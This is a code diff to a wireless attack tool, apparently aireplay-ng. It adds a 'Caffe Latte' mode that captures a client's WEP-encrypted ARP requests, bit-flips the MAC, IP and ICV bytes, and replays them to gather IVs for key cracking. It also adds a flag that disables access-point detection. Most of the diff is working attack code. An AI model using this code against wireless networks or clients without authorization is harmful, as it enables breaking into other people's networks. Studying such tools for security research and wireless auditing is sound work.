@@ -165,6 +165,7 @@ char usage[] =
 "      -t tods   : frame control, To      DS bit\n"
 "      -f fromds : frame control, From    DS bit\n"
 "      -w iswep  : frame control, WEP     bit\n"
+"      -D        : disable AP detection\n"
 "\n"
 "  Replay options:\n"
 "\n"
@@ -215,6 +216,7 @@ char usage[] =
 "      --arpreplay         : standard ARP-request replay (-3)\n"
 "      --chopchop          : decrypt/chopchop WEP packet (-4)\n"
 "      --fragment          : generates valid keystream   (-5)\n"
+"      --caffe-latte       : query a client for new IVs  (-6)\n"
 "      --test              : tests injection and quality (-9)\n"
 "\n"
 "      --help              : Displays this usage screen\n"
@@ -268,6 +270,8 @@ struct options
 
     int fast;
     int bittest;
+
+    int nodetect;
 }
 opt;
 
@@ -723,6 +727,9 @@ int attack_check(uchar* bssid, char* essid, uchar* capa, struct wif *wi)
 int getnet( uchar* capa, int filter, int force)
 {
     unsigned char *bssid;
+
+    if(opt.nodetect)
+        return 0;
 
     if(filter)
         bssid = opt.f_bssid;
@@ -2487,6 +2494,361 @@ add_arp:
                     perror( "malloc failed" );
                     return( 1 );
                 }
+
+                memcpy( arp[nb_arp].buf, h80211, caplen );
+                arp[nb_arp].len = caplen;
+                nb_arp++;
+
+                pkh.tv_sec  = tv.tv_sec;
+                pkh.tv_usec = tv.tv_usec;
+                pkh.caplen  = caplen;
+                pkh.len     = caplen;
+
+                n = sizeof( pkh );
+
+                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {
+                    perror( "fwrite failed" );
+                    return( 1 );
+                }
+
+                n = pkh.caplen;
+
+                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {
+                    perror( "fwrite failed" );
+                    return( 1 );
+                }
+
+                fflush( f_cap_out );
+            }
+        }
+    }
+
+    return( 0 );
+}
+
+int do_attack_caffe_latte( void )
+{
+    int nb_bad_pkt;
+    int arp_off1, arp_off2;
+    int i, n, caplen, nb_arp;
+    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;
+
+    time_t tc;
+    float f, ticks[3];
+    struct timeval tv;
+    struct timeval tv2;
+    struct tm *lt;
+
+    FILE *f_cap_out;
+    struct pcap_file_header pfh_out;
+    struct pcap_pkthdr pkh;
+    struct ARP_req * arp;
+
+    if ( opt.ringbuffer )
+        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );
+    else
+        arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );
+
+    /* capture only WEP data to broadcast address */
+
+    opt.f_type    = 2;
+    opt.f_subtype = 0;
+    opt.f_iswep   = 1;
+
+    if(getnet(NULL, 1, 1) != 0)
+        return 1;
+
+    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )
+    {
+        printf( "Please specify a BSSID (-b).\n" );
+        return( 1 );
+    }
+    /* create and write the output pcap header */
+
+    gettimeofday( &tv, NULL );
+
+    pfh_out.magic         = TCPDUMP_MAGIC;
+    pfh_out.version_major = PCAP_VERSION_MAJOR;
+    pfh_out.version_minor = PCAP_VERSION_MINOR;
+    pfh_out.thiszone      = 0;
+    pfh_out.sigfigs       = 0;
+    pfh_out.snaplen       = 65535;
+    pfh_out.linktype      = LINKTYPE_IEEE802_11;
+
+    lt = localtime( (const time_t *) &tv.tv_sec );
+
+    memset( strbuf, 0, sizeof( strbuf ) );
+    snprintf( strbuf,  sizeof( strbuf ) - 1,
+              "replay_arp-%02d%02d-%02d%02d%02d.cap",
+              lt->tm_mon + 1, lt->tm_mday,
+              lt->tm_hour, lt->tm_min, lt->tm_sec );
+
+    printf( "Saving ARP requests in %s\n", strbuf );
+
+    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
+    {
+        perror( "fopen failed" );
+        return( 1 );
+    }
+
+    n = sizeof( struct pcap_file_header );
+
+    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
+    {
+        perror( "fwrite failed\n" );
+        return( 1 );
+    }
+
+    fflush( f_cap_out );
+
+    printf( "You should also start airodump-ng to capture replies.\n" );
+
+    if(opt.port_in <= 0)
+    {
+        /* avoid blocking on reading the socket */
+        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
+        {
+            perror( "fcntl(O_NONBLOCK) failed" );
+            return( 1 );
+        }
+    }
+
+    memset( ticks, 0, sizeof( ticks ) );
+
+    tc = time( NULL ) - 11;
+
+    nb_pkt_read = 0;
+    nb_bad_pkt  = 0;
+    nb_ack_pkt  = 0;
+    nb_arp      = 0;
+    nb_arp_tot  = 0;
+    arp_off1    = 0;
+    arp_off2    = 0;
+
+    while( 1 )
+    {
+        /* sleep until the next clock tick */
+
+        if( dev.fd_rtc >= 0 )
+        {
+            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
+            {
+                perror( "read(/dev/rtc) failed" );
+                return( 1 );
+            }
+
+            ticks[0]++;
+            ticks[1]++;
+            ticks[2]++;
+        }
+        else
+        {
+            gettimeofday( &tv,  NULL );
+            usleep( 1000000/RTC_RESOLUTION );
+            gettimeofday( &tv2, NULL );
+
+            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
+                        + (float) ( tv2.tv_usec - tv.tv_usec );
+
+            ticks[0] += f / ( 1000000/RTC_RESOLUTION );
+            ticks[1] += f / ( 1000000/RTC_RESOLUTION );
+            ticks[2] += f / ( 1000000/RTC_RESOLUTION );
+        }
+
+        if( ticks[1] > (RTC_RESOLUTION/10) )
+        {
+            ticks[1] = 0;
+            printf( "\rRead %ld packets (got %ld ARPs and %ld ACKs), "
+                    "sent %ld packets...(%d pps)\r",
+                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)) );
+            fflush( stdout );
+        }
+
+        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )
+        {
+            /* threshold reach, send one frame */
+
+            ticks[2] = 0;
+
+            if( nb_arp > 0 )
+            {
+                if( nb_pkt_sent == 0 )
+                    ticks[0] = 0;
+
+                if( send_packet( arp[arp_off1].buf,
+                                 arp[arp_off1].len ) < 0 )
+                    return( 1 );
+
+                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )
+                {
+                    if( send_packet( arp[arp_off1].buf,
+                                    arp[arp_off1].len ) < 0 )
+                        return( 1 );
+                }
+
+                if( ++arp_off1 >= nb_arp )
+                    arp_off1 = 0;
+            }
+        }
+
+        /* read a frame, and check if it's an ARP request */
+
+        if( opt.s_file == NULL )
+        {
+            gettimeofday( &tv, NULL );
+
+            caplen = read_packet( h80211, sizeof( h80211 ), NULL );
+
+            if( caplen  < 0 ) return( 1 );
+            if( caplen == 0 ) continue;
+        }
+        else
+        {
+            n = sizeof( pkh );
+
+            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )
+            {
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( dev.pfh_in.magic == TCPDUMP_CIGAM )
+                SWAP32( pkh.caplen );
+
+            tv.tv_sec  = pkh.tv_sec;
+            tv.tv_usec = pkh.tv_usec;
+
+            n = caplen = pkh.caplen;
+
+            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )
+            {
+                printf( "\r\33[KInvalid packet length %d.\n", n );
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )
+            {
+                opt.s_file = NULL;
+                continue;
+            }
+
+            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
+            {
+                if( h80211[7] == 0x40 )
+                    n = 64;
+                else
+                    n = *(int *)( h80211 + 4 );
+
+                if( n < 8 || n >= (int) caplen )
+                    continue;
+
+                memcpy( tmpbuf, h80211, caplen );
+                caplen -= n;
+                memcpy( h80211, tmpbuf + n, caplen );
+            }
+        }
+
+        nb_pkt_read++;
+
+        /* check if it's a disas. or deauth packet */
+
+        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&
+            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )
+        {
+            nb_bad_pkt++;
+
+            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )
+            {
+                printf( "\33[KNotice: got a deauth/disassoc packet. Is the "
+                        "source MAC associated ?\n" );
+
+                tc = time( NULL );
+                nb_bad_pkt = 0;
+            }
+        }
+
+        if( h80211[0] == 0xD4 &&
+            ! memcmp( h80211 + 4, opt.f_bssid, 6 ) )
+        {
+            nb_ack_pkt++;
+        }
+
+        /* check if it's a potential ARP request */
+
+        opt.f_minlen = opt.f_maxlen = 68;
+
+        if( filter_packet( h80211, caplen ) == 0 )
+            goto add_arp;
+
+        opt.f_minlen = opt.f_maxlen = 86;
+
+        if( filter_packet( h80211, caplen ) == 0 )
+        {
+add_arp:
+            switch( h80211[1] & 3 )
+            {
+                case  1: /* ToDS */
+                {
+                    if(memcmp(h80211 + 16, BROADCAST, 6) == 0)
+                    {
+                        /* rewrite to a FromDS packet */
+
+                        memcpy( h80211 +  4, BROADCAST, 6 );
+                        memcpy( h80211 + 10, opt.f_bssid,  6 );
+                        memcpy( h80211 + 16, opt.f_bssid,  6 );
+
+                        h80211[1] = 0x42;   /* ToDS & WEP  */
+                    }
+                    else
+                    {
+                        nb_arp_tot++;
+                        continue;
+                    }
+
+                    break;
+                }
+                default:
+                    continue;
+            }
+
+            h80211[0] = 0x08;   /* normal data */
+
+            /* if same IV, perhaps our own packet, skip it */
+
+            for( i = 0; i < nb_arp; i++ )
+            {
+                if( memcmp( h80211 + 24, arp[i].buf + 24, 4 ) == 0 )
+                    break;
+            }
+
+            if( i < nb_arp )
+                continue;
+
+            if( caplen > 128)
+                continue;
+            /* add the ARP request in the ring buffer */
+
+            nb_arp_tot++;
+
+            /* Ring buffer size: by default: 8 ) */
+
+            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)
+                continue;
+            else {
+
+                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {
+                    perror( "malloc failed" );
+                    return( 1 );
+                }
+
+                h80211[49] ^= 0x01; //flip last bit of sender MAC
+                h80211[53] ^= 0x01; //flip last bit of sender IP
+
+                h80211[caplen-4] ^= 0x28;
+                h80211[caplen-3] ^= 0x04;
+                h80211[caplen-2] ^= 0x75;
+                h80211[caplen-1] ^= 0x78;
 
                 memcpy( arp[nb_arp].buf, h80211, caplen );
                 arp[nb_arp].len = caplen;
@@ -4817,7 +5179,7 @@ int main( int argc, char *argv[] )
     opt.ghost     =  0; opt.npackets    = -1;
     opt.delay     = 15; opt.bittest     =  0;
     opt.fast      =  0; opt.r_smac_set  =  0;
-    opt.npackets  =  1;
+    opt.npackets  =  1; opt.nodetect    =  0;
 
 /* XXX */
 #if 0
@@ -4846,6 +5208,7 @@ int main( int argc, char *argv[] )
             {"arpreplay",   0, 0, '3'},
             {"chopchop",    0, 0, '4'},
             {"fragment",    0, 0, '5'},
+            {"caffe-latte", 0, 0, '6'},
             {"test",        0, 0, '9'},
             {"help",        0, 0, 'H'},
             {"fast",        0, 0, 'F'},
@@ -4854,7 +5217,7 @@ int main( int argc, char *argv[] )
         };
 
         int option = getopt_long( argc, argv,
-                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:ji:r:k:l:y:o:q:0:1:23459HFB",
+                        "b:d:s:m:n:u:v:t:f:g:w:x:p:a:c:h:e:ji:r:k:l:y:o:q:0:1:234569HFBD",
                         long_options, &option_index );
 
         if( option < 0 ) break;
@@ -5079,6 +5442,11 @@ int main( int argc, char *argv[] )
                 opt.r_fromdsinj = 1;
                 break;
 
+            case 'D' :
+
+                opt.nodetect = 1;
+                break;
+
             case 'k' :
 
                 inet_aton( optarg, (struct in_addr *) opt.r_dip );
@@ -5224,6 +5592,17 @@ int main( int argc, char *argv[] )
                     return( 1 );
                 }
                 opt.a_mode = 5;
+                break;
+
+            case '6' :
+
+                if( opt.a_mode != -1 )
+                {
+                    printf( "Attack mode already specified.\n" );
+                    printf("\"%s --help\" for help.\n", argv[0]);
+                    return( 1 );
+                }
+                opt.a_mode = 6;
                 break;
 
             case '9' :
@@ -5461,6 +5840,7 @@ usage:
         case 3 : return( do_attack_arp_resend()  );
         case 4 : return( do_attack_chopchop()    );
         case 5 : return( do_attack_fragment()    );
+        case 6 : return( do_attack_caffe_latte() );
         case 9 : return( do_attack_test()        );
         default: break;
     }
